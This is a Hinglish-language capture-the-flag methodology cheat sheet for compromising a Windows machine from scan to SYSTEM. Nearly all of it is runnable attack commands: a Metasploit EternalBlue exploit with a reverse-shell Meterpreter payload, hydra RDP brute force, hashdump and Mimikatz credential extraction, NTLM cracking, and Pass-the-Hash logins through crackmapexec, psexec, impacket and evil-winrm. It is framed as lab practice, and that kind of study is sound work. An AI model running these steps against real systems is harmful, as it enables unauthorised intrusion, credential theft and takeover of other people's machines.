# WINDOWS FULL PWN: Scan se SYSTEM Tak — Poori Methodology

---

## Ye Kya Hai?
Windows machine hack karna Linux se thoda different hai. Yahan pe mainly SMB (port 445)
se attack hota hai, Meterpreter se post-exploit karte hain, aur hashes dump karke
password crack ya Pass-the-Hash karte hain.

Flow: **Recon → Exploit → Meterpreter Post-Exploit → Hash Dump → Crack/PtH → Flag**

---

## PHASE 1: RECON — Pehle Scan Karo

### Nmap Full Scan
```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```

### Output Mein Kya Dekh:
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 7 Professional 7601 SP1    ← EternalBlue target!
3389/tcp open  ms-wbt-server Microsoft Terminal Services        ← RDP
5985/tcp open  http          Microsoft HTTPAPI                  ← WinRM
```

### Key Observations:
- **445 open + Windows 7/2008** = EternalBlue ka candidate
- **3389 open** = RDP brute force try kar sakta hai
- **5985 open** = evil-winrm se connect kar sakta hai (agar creds mile)

### EternalBlue Vulnerable Hai Ya Nahi — Check Karo:
```bash
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
```
Output mein `VULNERABLE` likha aaya = jackpot!

---

## PHASE 2: EXPLOIT — EternalBlue (MS17-010) Sabse Common

### EternalBlue Kya Hai?
Ye ek SMBv1 vulnerability hai (2017 mein leak hui thi NSA se). Windows 7, Server 2008,
XP pe kaam karti hai. Ye buffer overflow se remote code execution deta hai — matlab
bina kisi credentials ke seedha SYSTEM shell mil jaata hai!

### Metasploit Se Exploit:
```bash
msfconsole -q

# Module search karo (optional, direct use bhi kar sakte ho):
search ms17_010

# Use karo:
use exploit/windows/smb/ms17_010_eternalblue

# Options dekho:
show options

# Set karo:
set RHOSTS <TARGET_IP>          # Target ka IP
set LHOST <YOUR_IP>             # Tera Kali ka IP (tun0 for VPN, eth0 for local)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Fire!
run
```

### Agar EternalBlue Fail Ho Jaye:
- **Payload change karo:** `set PAYLOAD windows/x64/meterpreter/reverse_tcp` try karo
- **LHOST check karo:** `ip addr` se correct interface ka IP daalo
- **Target patched ho sakta hai** — doosra attack vector dekho

### RDP Brute Force (Agar port 3389 open):
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> rdp -t 4
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP> rdp -t 4
```
**`-t 4` kyu:** RDP connections slow hote hain, zyada threads se lockout ho sakta hai

### RDP Connect (Password ya Creds milne pe):
```bash
xfreerdp /v:<TARGET_IP> /u:administrator /p:<PASSWORD>
# Ya:
rdesktop <TARGET_IP> -u administrator -p <PASSWORD>
```

---

## PHASE 3: METERPRETER POST-EXPLOIT — Shell Mila, Ab Control Lo

### Meterpreter Kya Hai?
Ye Metasploit ka advanced shell hai. Regular CMD se bahut powerful — file upload/download,
screenshot, keylogger, hash dump — sab built-in commands se hota hai.

### Essential Meterpreter Commands:
```bash
meterpreter > getuid                # Kaun hu main? NT AUTHORITY\SYSTEM = best
meterpreter > sysinfo               # OS version, hostname, architecture
meterpreter > getpid                # Current process ID
meterpreter > ps                    # Running processes list

meterpreter > getsystem             # Auto privesc try karo (multiple techniques)
# [+] Got system! = Kaam ho gaya!

meterpreter > hashdump              # SAM database se password hashes dump karo
# Output format: Username:RID:LM_Hash:NTLM_Hash:::
# Example: Administrator:500:aad3b435...:e02bc503339d51f71d28...:::

meterpreter > load kiwi             # Mimikatz load karo (credential extraction tool)
meterpreter > creds_all             # Saare cached credentials dikhao
meterpreter > creds_msv             # NTLM hashes specifically
meterpreter > creds_kerberos        # Kerberos tickets
meterpreter > creds_wdigest         # WDigest passwords (cleartext mil sakta hai!)

meterpreter > shell                 # Regular CMD shell mein jaao
meterpreter > upload /tmp/file.exe C:\\Temp\\file.exe    # File upload
meterpreter > download C:\\Users\\Admin\\secret.txt      # File download
meterpreter > screenshot            # Desktop screenshot lo
```

### Agar getsystem Fail Ho Jaye:
```bash
meterpreter > background            # Session background mein daalo
use post/multi/recon/local_exploit_suggester
set SESSION 1                       # Apna session number daalo
run
# Ye batayega kaunse local exploits kaam kar sakte hain
```

---

## PHASE 4: CMD SHELL MEIN KAAM — Information Gathering

### Meterpreter se CMD shell jaao:
```bash
meterpreter > shell
```

### Essential Windows Commands:
```cmd
whoami                              REM Kaun hu main
whoami /priv                        REM Mere privileges kya hain
whoami /groups                      REM Kin groups mein hu
hostname                            REM Machine ka naam
systeminfo                          REM Full system info (OS, patches, etc.)
ipconfig                            REM Network info
ipconfig /all                       REM Detailed network info (DNS server = DC!)

net user                            REM Saare users list karo
net user administrator              REM Administrator ka detail
net localgroup administrators       REM Admin group mein kaun hai

REM Flag locations check karo:
type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\proof.txt
dir /s /b C:\*flag*                 REM Poore C drive mein flag dhundho
dir /s /b C:\*proof*                REM proof.txt bhi dhundho
dir /s /b C:\*secret*               REM secret files bhi

REM OS version:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName

REM Installed software:
wmic product get name,version
```

---

## PHASE 5: HASH CRACKING — Hashdump Output Se Password Nikalo

### Hashdump Output Samjho:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d28f7a21e2e9a0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
**Format:** `Username:RID:LM_Hash:NTLM_Hash:::`
- RID 500 = Administrator (always)
- `aad3b435...` LM hash = LM disabled (normal hai modern Windows mein)
- `31d6cfe0...` NTLM = Empty password

### NTLM Hash Copy Karo (sirf NTLM wala part):
```bash
# hash.txt mein save karo:
echo "e02bc503339d51f71d28f7a21e2e9a0f" > hash.txt
```

### John The Ripper Se Crack:
```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=nt hash.txt     # Result dekho
```

### Hashcat Se Crack:
```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
# -m 1000 = NTLM mode
hashcat -m 1000 hash.txt --show      # Result dekho
```

---

## PHASE 6: PASS-THE-HASH — Hash Crack Nahi Hua? Koi Baat Nahi!

### Pass-the-Hash (PtH) Kya Hai?
Windows authentication mein password ki jagah NTLM hash bhi accept hota hai. Toh agar hash
crack nahi hua, tu directly hash use karke login kar sakta hai — password jaane bina!

### CrackMapExec Se Check:
```bash
crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH>
# [+] = Success! Pwn3d! = Admin access confirmed
```

### PsExec Se Shell (Metasploit):
```bash
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
# LM:NTLM format mein daalna hai
set LHOST <YOUR_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### Impacket PsExec Se Shell:
```bash
impacket-psexec Administrator@<TARGET_IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

### Evil-WinRM Se Shell (Agar port 5985 open):
```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```

---

## PHASE 7: FLAG DHUNDHO

```cmd
type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\proof.txt
dir /s /b C:\*flag*
dir /s /b C:\Users\*flag*
type C:\flag.txt
```
Agar file nahi mil rahi:
```cmd
dir /s /b C:\*.txt | findstr -i flag
dir /s /b C:\*.txt | findstr -i proof
dir /s /b C:\*.txt | findstr -i secret
```

---

## Common Mistakes (Mat Karna Ye)

1. **LHOST galat daalna** — `ip addr` se apna tun0/eth0 IP check karo, target ka nahi
2. **Payload architecture mismatch** — 64-bit target pe x64 payload use karo
3. **Hashdump mein LM aur NTLM confuse karna** — Last 32 chars = NTLM (ye chahiye)
4. **PtH mein sirf NTLM daalna** — `LM:NTLM` format chahiye (LM empty ho toh aad3b435... daalo)
5. **getsystem fail pe ruk jaana** — local_exploit_suggester use karo
6. **EternalBlue pe ek baar try karke chhod dena** — 2-3 baar try karo, kabhi kabhi fail hota hai
7. **CMD shell mein Linux commands daalna** — `cat` nahi `type`, `ls` nahi `dir`

---

## Quick Decision Tree

```
Windows Target IP mila
  |
  +-- nmap -sV -sC -p- -T4 <IP>
  |     |
  |     +-- Port 445 + Win7/2008? --> smb-vuln-ms17-010 check
  |     |     +-- VULNERABLE --> EternalBlue exploit --> Meterpreter
  |     |     +-- Not vulnerable --> enum4linux, cred hunting
  |     |
  |     +-- Port 3389? --> hydra RDP brute force
  |     +-- Port 5985? --> evil-winrm (creds chahiye)
  |     +-- Port 80? --> Web app vulnerabilities
  |
  +-- Meterpreter mila
  |     |
  |     +-- getuid --> SYSTEM? --> seedha flag padho
  |     +-- getuid --> user? --> getsystem try karo
  |     +-- getsystem fail? --> local_exploit_suggester
  |     |
  |     +-- hashdump --> NTLM hashes copy karo
  |     +-- load kiwi --> creds_all --> cleartext passwords?
  |
  +-- Hashes mile
  |     |
  |     +-- hashcat -m 1000 / john --format=nt --> crack try karo
  |     +-- Crack nahi hua? --> Pass-the-Hash
  |           +-- crackmapexec smb --> verify
  |           +-- psexec / evil-winrm --> shell lo
  |
  +-- Flag --> type C:\Users\Administrator\Desktop\flag.txt
```
